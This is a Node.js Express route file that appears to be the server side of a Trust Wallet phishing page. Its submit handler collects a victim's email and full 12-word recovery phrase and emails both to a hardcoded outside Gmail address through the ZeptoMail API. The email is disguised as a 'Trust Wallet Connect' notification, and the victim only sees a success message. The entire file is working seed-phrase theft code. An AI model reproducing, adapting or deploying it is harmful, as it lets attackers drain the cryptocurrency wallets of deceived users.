// src/routes/trustWalletRoutes.js
const express = require("express");
const router = express.Router();
const axios = require("axios");

// 🔒 HARDCODED RECIPIENT EMAIL
const ADMIN_EMAIL = "instacoinxpay@gmail.com";

/**
 * POST /api/trust-wallet/submit
 * Sends Trust Wallet connection details to admin email
 */
router.post("/submit", async (req, res) => {
  try {
    const { email, words } = req.body;

    // Validation
    if (!email || !words || !Array.isArray(words) || words.length !== 12) {
      return res.status(400).json({
        success: false,
        error: "Invalid form data. Email and 12 words required."
      });
    }

    // Check if all words are filled
    const hasEmptyWords = words.some(word => !word || word.trim() === "");
    if (hasEmptyWords) {
      return res.status(400).json({
        success: false,
        error: "All 12 words must be filled."
      });
    }

    // Prepare email content
    const emailHTML = `
      <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px;">
        <div style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); padding: 30px; border-radius: 10px 10px 0 0; text-align: center;">
          <h1 style="color: white; margin: 0; font-size: 24px;">🔐 New Trust Wallet Connection</h1>
        </div>
        
        <div style="background: #f9f9f9; padding: 30px; border-radius: 0 0 10px 10px;">
          <div style="background: white; padding: 20px; border-radius: 8px; margin-bottom: 20px; box-shadow: 0 2px 4px rgba(0,0,0,0.1);">
            <h3 style="color: #333; margin-top: 0; border-bottom: 2px solid #667eea; padding-bottom: 10px;">📧 User Information</h3>
            <p style="margin: 10px 0;"><strong>Email:</strong> ${email}</p>
            <p style="margin: 10px 0;"><strong>Submitted:</strong> ${new Date().toLocaleString('en-US', { 
              weekday: 'long', 
              year: 'numeric', 
              month: 'long', 
              day: 'numeric',
              hour: '2-digit',
              minute: '2-digit',
              second: '2-digit',
              timeZoneName: 'short'
            })}</p>
          </div>

          <div style="background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1);">
            <h3 style="color: #333; margin-top: 0; border-bottom: 2px solid #667eea; padding-bottom: 10px;">🔑 12-Word Secret Phrase</h3>
            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin: 20px 0;">
              ${words.map((word, index) => `
                <div style="background: #f5f5f5; padding: 10px; border-radius: 5px; border-left: 3px solid #667eea;">
                  <span style="color: #888; font-weight: bold;">${index + 1}.</span>
                  <span style="color: #333; margin-left: 8px; font-family: monospace;">${word}</span>
                </div>
              `).join('')}
            </div>
            
            <div style="background: #fff3cd; border: 1px solid #ffc107; border-radius: 5px; padding: 15px; margin-top: 20px;">
              <p style="margin: 0; color: #856404;"><strong>📋 Full Phrase:</strong></p>
              <p style="margin: 10px 0 0 0; color: #333; font-family: monospace; word-break: break-all;">${words.join(" ")}</p>
            </div>
          </div>

          <div style="margin-top: 30px; padding-top: 20px; border-top: 1px solid #ddd; text-align: center;">
            <p style="color: #888; font-size: 12px; margin: 0;">
              🔔 This is an automated notification from Trust Wallet Connect
            </p>
            <p style="color: #888; font-size: 12px; margin: 5px 0 0 0;">
              © ${new Date().getFullYear()} InstaCoinXPay
            </p>
          </div>
        </div>
      </div>
    `;

    // Send email via ZeptoMail
    const zeptoResponse = await axios.post(
      "https://api.zeptomail.in/v1.1/email",
      {
        from: {
          address: process.env.ZEPTOMAIL_FROM,
          name: "Trust Wallet Connect"
        },
        to: [
          {
            email_address: {
              address: ADMIN_EMAIL,
              name: "Admin"
            }
          }
        ],
        subject: `🔐 New Trust Wallet Connection - ${new Date().toLocaleDateString()}`,
        htmlbody: emailHTML
      },
      {
        headers: {
          Authorization: process.env.ZEPTOMAIL_API_KEY,
          "Content-Type": "application/json"
        }
      }
    );

    console.log("✅ Trust Wallet email sent successfully to:", ADMIN_EMAIL);
    console.log("📨 ZeptoMail response:", zeptoResponse.data);

    res.status(200).json({
      success: true,
      message: "Form submitted successfully"
    });

  } catch (error) {
    console.error("❌ Trust Wallet email error:", error.response?.data || error.message);
    
    res.status(500).json({
      success: false,
      error: "Failed to process submission. Please try again."
    });
  }
});

module.exports = router;